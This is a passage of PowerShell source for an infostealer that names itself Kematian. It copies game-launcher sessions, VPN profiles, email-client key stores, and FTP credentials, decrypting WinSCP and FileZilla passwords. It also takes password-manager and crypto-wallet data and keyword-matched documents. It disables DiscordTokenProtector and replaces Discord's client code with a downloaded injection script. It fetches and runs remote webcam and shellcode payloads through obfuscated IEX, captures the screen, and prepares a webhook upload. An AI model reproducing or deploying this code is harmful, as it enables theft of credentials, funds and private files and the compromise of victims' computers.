                "Microsoft Store" = Join-Path $env:userprofile "AppData\Roaming\.minecraft\launcher_accounts_microsoft_store.json"
                "Rise"            = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Rise\alts.txt"
                "Rise (Intent)"   = Join-Path $env:userprofile "intentlauncher\Rise\alts.txt"
                "Paladium"        = Join-Path $env:userprofile "AppData\Roaming\paladium-group\accounts.json"
                "PolyMC"          = Join-Path $env:userprofile "AppData\Roaming\PolyMC\accounts.json"
                "Badlion"         = Join-Path $env:userprofile "AppData\Roaming\Badlion Client\accounts.json"
            }
        } 
        foreach ($launcher in $minecraft_paths.Keys) {
            foreach ($pathName in $minecraft_paths[$launcher].Keys) {
                $sourcePath = $minecraft_paths[$launcher][$pathName]
                if (Test-Path $sourcePath) {
                    $destination = Join-Path -Path $minecraft_session -ChildPath $pathName
                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
                    Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
                }
            }
        }
    }
    minecraftstealer

    # Epicgames 
    function epicgames_stealer {
        $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
        if (!(Test-Path $epicgamesfolder)) { return }
        $epicgames_session = "$folder_gaming\EpicGames"
        New-Item -ItemType Directory -Force -Path $epicgames_session | Out-Null
        Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
    }
    epicgames_stealer

    # Ubisoft 
    function ubisoftstealer {
        $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
        if (!(Test-Path $ubisoftfolder)) { return }
        $ubisoft_session = "$folder_gaming\Ubisoft"
        New-Item -ItemType Directory -Force -Path $ubisoft_session | Out-Null
        Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
    }
    ubisoftstealer

    # EA 
    function electronic_arts {
        $eafolder = "$env:localappdata\Electronic Arts\EA Desktop\CEF"
        if (!(Test-Path $eafolder)) { return }
        $ea_session = "$folder_gaming\Electronic Arts"
        New-Item -ItemType Directory -Path $ea_session -Force | Out-Null
        $parentDirName = (Get-Item $eafolder).Parent.Name
        $destination = Join-Path $ea_session $parentDirName
        New-Item -ItemType Directory -Path $destination -Force | Out-Null
        Copy-Item -Path $eafolder -Destination $destination -Recurse -Force
    }
    electronic_arts

    # Growtopia 
    function growtopiastealer {
        $growtopiafolder = "$env:localappdata\Growtopia"
        if (!(Test-Path $growtopiafolder)) { return }
        $growtopia_session = "$folder_gaming\Growtopia"
        New-Item -ItemType Directory -Force -Path $growtopia_session | Out-Null
        $save_file = "$growtopiafolder\save.dat"
        if (Test-Path $save_file) { Copy-Item -Path $save_file -Destination $growtopia_session } 
    }
    growtopiastealer

    # Battle.net
    function battle_net_stealer {
        $battle_folder = "$env:appdata\Battle.net"
        if (!(Test-Path $battle_folder)) { return }
        $battle_session = "$folder_gaming\Battle.net"
        New-Item -ItemType Directory -Force -Path $battle_session | Out-Null
        $files = Get-ChildItem -Path $battle_folder -File -Recurse -Include "*.db", "*.config" 
        foreach ($file in $files) {
            Copy-Item -Path $file.FullName -Destination $battle_session
        }
    }
    battle_net_stealer

    # All VPN Sessions

    # ProtonVPN
    function protonvpnstealer {   
        $protonvpnfolder = "$env:localappdata\protonvpn"  
        if (!(Test-Path $protonvpnfolder)) { return }
        $protonvpn_account = "$folder_vpn\ProtonVPN"
        New-Item -ItemType Directory -Force -Path $protonvpn_account | Out-Null
        $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
    }
    protonvpnstealer


    #Surfshark VPN
    function surfsharkvpnstealer {
        $surfsharkvpnfolder = "$env:appdata\Surfshark"
        if (!(Test-Path $surfsharkvpnfolder)) { return }
        $surfsharkvpn_account = "$folder_vpn\Surfshark"
        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account | Out-Null
        Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
    }
    surfsharkvpnstealer
    
    # OpenVPN 
    function openvpn_stealer {
        $openvpnfolder = "$env:userprofile\AppData\Roaming\OpenVPN Connect"
        if (!(Test-Path $openvpnfolder)) { return }
        $openvpn_accounts = "$folder_vpn\OpenVPN"
        New-Item -ItemType Directory -Force -Path $openvpn_accounts | Out-Null
        Copy-Item -Path "$openvpnfolder\profiles" -Destination $openvpn_accounts -Recurse -force 
        Copy-Item -Path "$openvpnfolder\config.json" -Destination $openvpn_accounts -Recurse -force 
    }
    openvpn_stealer
    
    # Thunderbird 
    function thunderbirdbackup {
    $thunderbirdfolder = "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles"
    if (!(Test-Path $thunderbirdfolder)) { return }
    $thunderbirdbackup = "$folder_email\Thunderbird"
    New-Item -ItemType Directory -Force -Path $thunderbirdbackup | Out-Null
    $pattern = "^[a-z0-9]+\.default-esr$"
    $directories = Get-ChildItem -Path $thunderbirdfolder -Directory | Where-Object { $_.Name -match $pattern }
    $filter = @("key4.db","key3.db","logins.json","cert9.db","*.js")
    foreach ($directory in $directories) {
        $destinationPath = Join-Path -Path $thunderbirdbackup -ChildPath $directory.Name
        New-Item -ItemType Directory -Force -Path $destinationPath | Out-Null
        foreach ($filePattern in $filter) {
            Get-ChildItem -Path $directory.FullName -Recurse -Filter $filePattern -File | ForEach-Object {
                $relativePath = $_.FullName.Substring($directory.FullName.Length).TrimStart('\')
                $destFilePath = Join-Path -Path $destinationPath -ChildPath $relativePath
                $destFileDir = Split-Path -Path $destFilePath -Parent
                if (!(Test-Path -Path $destFileDir)) {
                    New-Item -ItemType Directory -Force -Path $destFileDir | Out-Null
                }
                Copy-Item -Path $_.FullName -Destination $destFilePath -Force
            }
        }
      }
    }
    thunderbirdbackup

    # FTP Clients 

    # Filezilla 
    function filezilla_stealer {
        $FileZillafolder = "$env:appdata\FileZilla"
        if (!(Test-Path $FileZillafolder)) { return }
        $filezilla_hosts = "$ftp_clients\FileZilla"
        New-Item -ItemType Directory -Force -Path $filezilla_hosts | Out-Null
        $recentServersXml = Join-Path -Path $FileZillafolder -ChildPath 'recentservers.xml'
        $siteManagerXml = Join-Path -Path $FileZillafolder -ChildPath 'sitemanager.xml'
        function ParseServerInfo {
            param ([string]$xmlContent)
            $matches = [regex]::Match($xmlContent, "<Host>(.*?)</Host>.*<Port>(.*?)</Port>")
            $serverHost = $matches.Groups[1].Value
            $serverPort = $matches.Groups[2].Value
            $serverUser = [regex]::Match($xmlContent, "<User>(.*?)</User>").Groups[1].Value
            # Check if both User and Pass are blank
            if ([string]::IsNullOrWhiteSpace($serverUser)) { return "Host: $serverHost `nPort: $serverPort`n" }
            # if User is not blank, continue with authentication details
            $encodedPass = [regex]::Match($xmlContent, "<Pass encoding=`"base64`">(.*?)</Pass>").Groups[1].Value
            $decodedPass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPass))
            return "Host: $serverHost `nPort: $serverPort `nUser: $serverUser `nPass: $decodedPass`n"
        }       
        $serversInfo = @()
        foreach ($xmlFile in @($recentServersXml, $siteManagerXml)) {
            if (Test-Path $xmlFile) {
                $xmlContent = Get-Content -Path $xmlFile
                $servers = [System.Collections.ArrayList]@()
                $xmlContent | Select-String -Pattern "<Server>" -Context 0, 10 | ForEach-Object {
                    $serverInfo = ParseServerInfo -xmlContent $_.Context.PostContext
                    $servers.Add($serverInfo) | Out-Null
                }
                $serversInfo += $servers -join "`n"
            }
        }
        $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
        Write-Host "[!] Filezilla Session information saved" -ForegroundColor Green
    }
    filezilla_stealer
	
    #  WinSCP  
    function Get-WinSCPSessions {
        $registryPath = "SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
        $winscp_session = "$ftp_clients\WinSCP"
        New-Item -ItemType Directory -Force -Path $winscp_session | Out-Null
        $outputPath = "$winscp_session\WinSCP-sessions.txt"
        $output = "WinSCP Sessions`n`n"
        $hive = [UInt32] "2147483649" # HKEY_CURRENT_USER
        function Get-RegistryValue {
            param ([string]$subKey, [string]$valueName)
            $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name GetStringValue -ArgumentList $hive, $subKey, $valueName
            return $result.sValue
        }
        function Get-RegistrySubKeys {
            param ([string]$subKey)
            $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name EnumKey -ArgumentList $hive, $subKey
            return $result.sNames
        }
        $sessionKeys = Get-RegistrySubKeys -subKey $registryPath
        if ($null -eq $sessionKeys) {
            Write-Host "[!] Failed to enumerate registry keys under $registryPath" -ForegroundColor Red
            return
        }
        function DecryptNextCharacterWinSCP {
            param ([string]$remainingPass)
            $Magic = 163
            $flagAndPass = "" | Select-Object -Property flag, remainingPass
            $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
            $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
            $Added = $firstval + $secondval
            $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
            $flagAndPass.flag = $decryptedResult
            $flagAndPass.remainingPass = $remainingPass.Substring(2)
            return $flagAndPass
        }
        function DecryptWinSCPPassword {
            param ([string]$SessionHostname, [string]$SessionUsername, [string]$Password)
            $CheckFlag = 255
            $Magic = 163
            $key = $SessionHostname + $SessionUsername
            $values = DecryptNextCharacterWinSCP -remainingPass $Password
            $storedFlag = $values.flag
            if ($values.flag -eq $CheckFlag) {
                $values.remainingPass = $values.remainingPass.Substring(2)
                $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
            }
            $len = $values.flag
            $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
            $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
            $finalOutput = ""
            for ($i = 0; $i -lt $len; $i++) {
                $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
                $finalOutput += [char]$values.flag
            }
            if ($storedFlag -eq $CheckFlag) {
                return $finalOutput.Substring($key.Length)
            }
            return $finalOutput
        }
        foreach ($sessionKey in $sessionKeys) {
            $sessionName = $sessionKey
            $sessionPath = "$registryPath\$sessionName"
            $hostname = Get-RegistryValue -subKey $sessionPath -valueName "HostName"
            $username = Get-RegistryValue -subKey $sessionPath -valueName "UserName"
            $encryptedPassword = Get-RegistryValue -subKey $sessionPath -valueName "Password"
            if ($encryptedPassword) {
                $password = DecryptWinSCPPassword -SessionHostname $hostname -SessionUsername $username -Password $encryptedPassword
            }
            else {
                $password = "No password saved"
            }
            $output += "Session  : $sessionName`n"
            $output += "Hostname : $hostname`n"
            $output += "Username : $username`n"
            $output += "Password : $password`n`n"
        }
        $output | Out-File -FilePath $outputPath
        Write-Host "[!] WinSCP Session information saved" -ForegroundColor Green
    }
    Get-WinSCPSessions

    # Password Managers
    function password_managers {
    $browserPaths = @{
        "Brave"        = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
        "Chrome"       = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
        "Chromium"     = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
        "Edge"         = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
        "EpicPrivacy"  = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
        "Iridium"      = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
        "Opera"        = Join-Path $env:APPDATA "Opera Software\Opera Stable"
        "OperaGX"      = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
        "Vivaldi"      = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
        "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
    }
    $password_mgr_dirs = @{
        "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"                  
        "eiaeiblijfjekdanodkjadfinkhbfgcd" = "NordPass" 
        "fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane" 
        "nngceckbapebfimnlniiiahkandclblb" = "Bitwarden" 
        "pnlccmojcmeohlpggmfnbbiapkmbliob" = "RoboForm" 
        "bfogiafebfohielmmehodmfbbebbbpei" = "Keeper" 
        "cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword" 
        "oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC" 
        "hdokiejnpimakedhajhdlcegeplioahd" = "LastPass" 
    }
    foreach ($browser in $browserPaths.GetEnumerator()) {
        $browserName = $browser.Key
        $browserPath = $browser.Value
        if (Test-Path $browserPath) {
            Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
                $localExtensionsSettingsDir = $_.FullName
                foreach ($password_mgr_dir in $password_mgr_dirs.GetEnumerator()) {
                    $passwordmgrkey = $password_mgr_dir.Key
                    $password_manager = $password_mgr_dir.Value
                    $extentionPath = Join-Path $localExtensionsSettingsDir $passwordmgrkey
                    if (Test-Path $extentionPath) {
                        if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
                            try {
                                $password_mgr_browser = "$password_manager ($browserName)"
                                $password_dir_path = Join-Path $password_managers $password_mgr_browser
                                New-Item -ItemType Directory -Path $password_dir_path -Force | out-null
                                Copy-Item -Path $extentionPath -Destination $password_dir_path -Recurse -Force
                                $locationFile = Join-Path $password_dir_path "Location.txt"
                                $extentionPath | Out-File -FilePath $locationFile -Force
                                Write-Host "[!] Copied $password_manager from $extentionPath to $password_dir_path" -ForegroundColor Green
                            }
                            catch {
                                Write-Host "[!] Failed to copy $password_manager from $extentionPath" -ForegroundColor Red
                            }
                        }
                    }
                }
            }
        }
      }
    }
    password_managers

    function Local_Crypto_Wallets {
        $wallet_paths = @{
            "Local Wallets" = @{
                "Armory"           = Join-Path $env:appdata      "\Armory\*.wallet"
                "Atomic"           = Join-Path $env:appdata      "\Atomic\Local Storage\leveldb"
                "Bitcoin"          = Join-Path $env:appdata      "\Bitcoin\wallets"
                "Bytecoin"         = Join-Path $env:appdata      "\bytecoin\*.wallet"
                "Coinomi"          = Join-Path $env:localappdata "Coinomi\Coinomi\wallets"
                "Dash"             = Join-Path $env:appdata      "\DashCore\wallets"
                "Electrum"         = Join-Path $env:appdata      "\Electrum\wallets"
                "Ethereum"         = Join-Path $env:appdata      "\Ethereum\keystore"
                "Exodus"           = Join-Path $env:appdata      "\Exodus\exodus.wallet"
                "Guarda"           = Join-Path $env:appdata      "\Guarda\Local Storage\leveldb"
                "com.liberty.jaxx" = Join-Path $env:appdata      "\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
                "Litecoin"         = Join-Path $env:appdata      "\Litecoin\wallets"
                "MyMonero"         = Join-Path $env:appdata      "\MyMonero\*.mmdbdoc_v1"
                "Monero GUI"       = Join-Path $env:appdata      "Documents\Monero\wallets\"
            }
        }
        $zephyr_path = "$env:appdata\Zephyr\wallets"
        New-Item -ItemType Directory -Path "$folder_crypto\Zephyr" -Force | Out-Null
        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force}	
        foreach ($wallet in $wallet_paths.Keys) {
            foreach ($pathName in $wallet_paths[$wallet].Keys) {
                $sourcePath = $wallet_paths[$wallet][$pathName]
                if (Test-Path $sourcePath) {
                    $destination = Join-Path -Path $folder_crypto -ChildPath $pathName
                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
                    Copy-Item -Path $sourcePath -Recurse -Destination $destination -Force
                }
            }
        }
    }
    Local_Crypto_Wallets
	
    function browserwallets {
    $browserPaths = @{
        "Brave"        = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
        "Chrome"       = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
        "Chromium"     = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
        "Edge"         = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
        "EpicPrivacy"  = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
        "Iridium"      = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
        "Opera"        = Join-Path $env:APPDATA "Opera Software\Opera Stable"
        "OperaGX"      = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
        "Vivaldi"      = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
        "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
    }
    $walletDirs = @{
        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
    	"ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
    	"odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
    	"aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
    	"hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
        "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
        "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
        "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
        "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
        "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
        "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
    }
    foreach ($browser in $browserPaths.GetEnumerator()) {
        $browserName = $browser.Key
        $browserPath = $browser.Value
        if (Test-Path $browserPath) {
            Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
                $localExtensionsSettingsDir = $_.FullName
                foreach ($walletDir in $walletDirs.GetEnumerator()) {
                    $walletKey = $walletDir.Key
                    $walletName = $walletDir.Value
                    $extentionPath = Join-Path $localExtensionsSettingsDir $walletKey
                    if (Test-Path $extentionPath) {
                        if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
                            try {
                                $wallet_browser = "$walletName ($browserName)"
                                $walletDirPath = Join-Path $folder_crypto $wallet_browser
                                New-Item -ItemType Directory -Path $walletDirPath -Force | out-null
                                Copy-Item -Path $extentionPath -Destination $walletDirPath -Recurse -Force
                                $locationFile = Join-Path $walletDirPath "Location.txt"
                                $extentionPath | Out-File -FilePath $locationFile -Force
                                Write-Host "[!] Copied $walletName wallet from $extentionPath to $walletDirPath" -ForegroundColor Green
                            }
                            catch {
                                Write-Host "[!] Failed to copy $walletName wallet from $extentionPath" -ForegroundColor Red
                            }
                        }
                    }
                }
            }
        }
    }
    }
    browserwallets
 
	
    Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green

    # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
    #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.

    # Fix webcam hang with unsupported devices
    
    Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
    $webcam = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
    $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
    $invokewebcam.WaitForExit()

    function FilesGrabber {
        $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
        $keywords = @("2fa", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
        $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
        foreach ($path in $paths) {
            $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
                $_.Length -lt 1mb -and $_.Name -match ($keywords -join '|')
            }
            foreach ($file in $files) {
                $destination = Join-Path -Path $important_files -ChildPath $file.Name
                if ($file.FullName -ne $destination) {
                    Copy-Item -Path $file.FullName -Destination $destination -Force
                }
            }
        }
        # Send info about the keywords that match a grabbed file
        $keywordsUsed = @()
        foreach ($keyword in $keywords) {
            foreach ($file in (Get-ChildItem -Path $important_files -Recurse)) {
                if ($file.Name -like "*$keyword*") {
                    if ($file.Length -lt 1mb) {
                        if ($keywordsUsed -notcontains $keyword) {
                            $keywordsUsed += $keyword
                            $keywordsUsed | Out-File "$folder_general\Important_Files_Keywords.txt" -Force
                        }
                    }
                }
            }
        }
    }
    FilesGrabber

    Set-Location "$env:LOCALAPPDATA\Temp"

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force -ErrorAction 'SilentlyContinue'
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force -ErrorAction 'SilentlyContinue'
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }


    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")

    foreach ($path in $discPaths) {
        $skibidipath = Join-Path $locAppData $path
        if (-not (Test-Path $skibidipath)) {
            continue
        }
        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
                $files = Get-ChildItem $_.FullName
                foreach ($file in $files) {
                    if ($file.Name -eq "index.js") {
                        $webClient = New-Object System.Net.WebClient
                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
                        if ($content -ne "") {
                            $replacedContent = $content -replace "%WEBHOOK%", $webhook
                            $replacedContent | Set-Content -Path $file.FullName -Force
                        }
                    }
                }
            }
        }
    }
    
    #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
    
    Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
    $kematian_shellcode = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
    $proc.WaitForExit()
    Write-Host "[!] Shellcode Injection Completed" -ForegroundColor Green


    $main_temp = "$env:localappdata\temp"

    $width, $height = $screen -split ' x '
    $monitor = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $top = $monitor.Top
    $left = $monitor.Left
    $bounds = [System.Drawing.Rectangle]::FromLTRB($left, $top, [int]$width, [int]$height)
    $image = New-Object System.Drawing.Bitmap([int]$bounds.Width, [int]$bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($image)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $image.Save("$main_temp\screenshot.png")
    $graphics.Dispose()
    $image.Dispose()


    Write-Host "[!] Screenshot Captured" -ForegroundColor Green

    Move-Item "$main_temp\discord.json" $folder_general -Force    
    Move-Item "$main_temp\screenshot.png" $folder_general -Force
    Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
    #move any file that starts with cookies_netscape
    Get-ChildItem -Path $main_temp -Filter "cookies_netscape*" | Move-Item -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force

    #remove empty dirs
    do {
        $dirs = Get-ChildItem $folder_general -Directory -Recurse | Where-Object { (Get-ChildItem $_.FullName).Count -eq 0 } | Select-Object -ExpandProperty FullName
        $dirs | ForEach-Object { Remove-Item $_ -Force }
    } while ($dirs.Count -gt 0)
    
    Write-Host "[!] Getting information about the extracted data" -ForegroundColor Green
    
    function ProcessCookieFiles {
        $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
        $cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
        foreach ($file in $cookieFiles) {
            $outputFileName = $file.Name -replace "^cookies_netscape_|-Browser"
            $fileContents = Get-Content -Path $file.FullName
            $domainCounts = @{}
            foreach ($line in $fileContents) {
                if ($line -match "^\s*(\S+)\s") {
                    $domain = $matches[1].TrimStart('.')
                    if ($domainCounts.ContainsKey($domain)) {
                        $domainCounts[$domain]++
                    }
                    else {
                        $domainCounts[$domain] = 1
                    }
                }
            }
            $outputString = ($domainCounts.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name) ($($_.Value))" }) -join "`n"
            $outputFilePath = Join-Path -Path $domaindetects -ChildPath $outputFileName
            Set-Content -Path $outputFilePath -Value $outputString
        }
    }
    ProcessCookieFiles 
    
    # Send info about the data in the Kematian.zip
    function kematianinfo {    
        $messaging_sessions_info = if (Test-Path $folder_messaging) {
            $messaging_sessions_content = Get-ChildItem -Path $folder_messaging -Directory | ForEach-Object { $_.Name -replace '\..+$' }
            if ($messaging_sessions_content) {
                $messaging_sessions_content -join ' | '
            }
            else {
                'False'
            }
        }
        else {
            'False'
        }

        $gaming_sessions_info = if (Test-Path $folder_gaming) {
            $gaming_sessions_content = Get-ChildItem -Path $folder_gaming -Directory | ForEach-Object { $_.Name -replace '\..+$' }
            if ($gaming_sessions_content) {
                $gaming_sessions_content -join ' | '
            }
            else {
                'False'
            }
        }
        else {
            'False'
        }

        $wallets_found_info = if (Test-Path $folder_crypto) {
            $wallets_found_content = Get-ChildItem -Path $folder_crypto -Directory | ForEach-Object { $_.Name -replace '\..+$' }
            if ($wallets_found_content) {
                $wallets_found_content -join ' | '
            }
            else {
                'False'
            }
        }
        else {
            'False'
        }

        $vpn_accounts_info = if (Test-Path $folder_vpn) {
            $vpn_accounts_content = Get-ChildItem -Path $folder_vpn -Directory | ForEach-Object { $_.Name -replace '\..+$' }
            if ($vpn_accounts_content) {
                $vpn_accounts_content -join ' | '
            }
            else {
                'False'
            }
        }
        else {
            'False'
        }

        $email_clients_info = if (Test-Path $folder_email) {
             $email_clients_content = Get-ChildItem -Path $folder_email -Directory | ForEach-Object { $_.Name -replace '\..+$' }
            if ($email_clients_content) {
                $email_clients_content -join ' | '
            }
            else {
                'False'
            }
        }
        else {
            'False'
        }

        $important_files_info = if (Test-Path $important_files) {
            $file_count = (Get-ChildItem -Path $important_files -File).Count
            if ($file_count -gt 0) {
            ($file_count)
            }
            else {
                'False'
            }
        }
        else {
            'False'
        }

        $browser_data_info = if (Test-Path $browser_data) {
            $browser_data_content = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*" -File | ForEach-Object { $_.Name -replace '\..+$' }
            $browser_data_content = $browser_data_content -replace "^cookies_netscape_|-Browser$", ""
            if ($browser_data_content) {
                $browser_data_content -join ' | '
            }
            else {
                'False'
            }
        }
        else {
            'False'
        }

        $ftp_accounts_info = if (Test-Path $ftp_clients) {
            $ftp_accounts_content = Get-ChildItem -Path $ftp_clients -Directory | ForEach-Object { $_.Name -replace '\..+$' }
            if ($ftp_accounts_content) {
                $ftp_accounts_content -join ' | '
            }
            else {
                'False'
            }
        }
        else {
            'False'
        }
        $passwordmanagers_accounts_info = if (Test-Path $password_managers) {
            $passwordmanagers_content = Get-ChildItem -Path $password_managers -Directory | ForEach-Object { $_.Name -replace '\..+$' }
           if ($passwordmanagers_content) {
               $passwordmanagers_content -join ' | '
           }
           else {
                'False'
            }
        }
        else {
            'False'
        }

        # Add data to webhook
        $webhookData = "Messaging Sessions: $messaging_sessions_info `nGaming Sessions: $gaming_sessions_info `nCrypto Wallets: $wallets_found_info `nVPN Accounts: $vpn_accounts_info `nEmail Clients: $email_clients_info `nImportant Files: $important_files_info `nBrowser Data: $browser_data_info `nFTP Clients: $ftp_accounts_info `nPassword Managers: $passwordmanagers_accounts_info"
        return $webhookData
    }     
    $kematainwebhook = kematianinfo
    
    # Send discord tokens in webhook message 
    $discord_tokens = if (Test-Path "$folderformat\discord.json") {
        $jsonContent = Get-Content -Path "$folderformat\discord.json" -Raw
        $tokenMatches = [regex]::Matches($jsonContent, '"token": "(.*?)"')
    
        if ($tokenMatches.Count -gt 0) {
            $tokens = foreach ($match in $tokenMatches) {
                $token = $match.Groups[1].Value
                $token
            }
            $tokens -join "`n`n"
        }
        else {
            'False'
        }
    }

    Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
    $embed_and_body = @{
        "username"   = "Kematian"
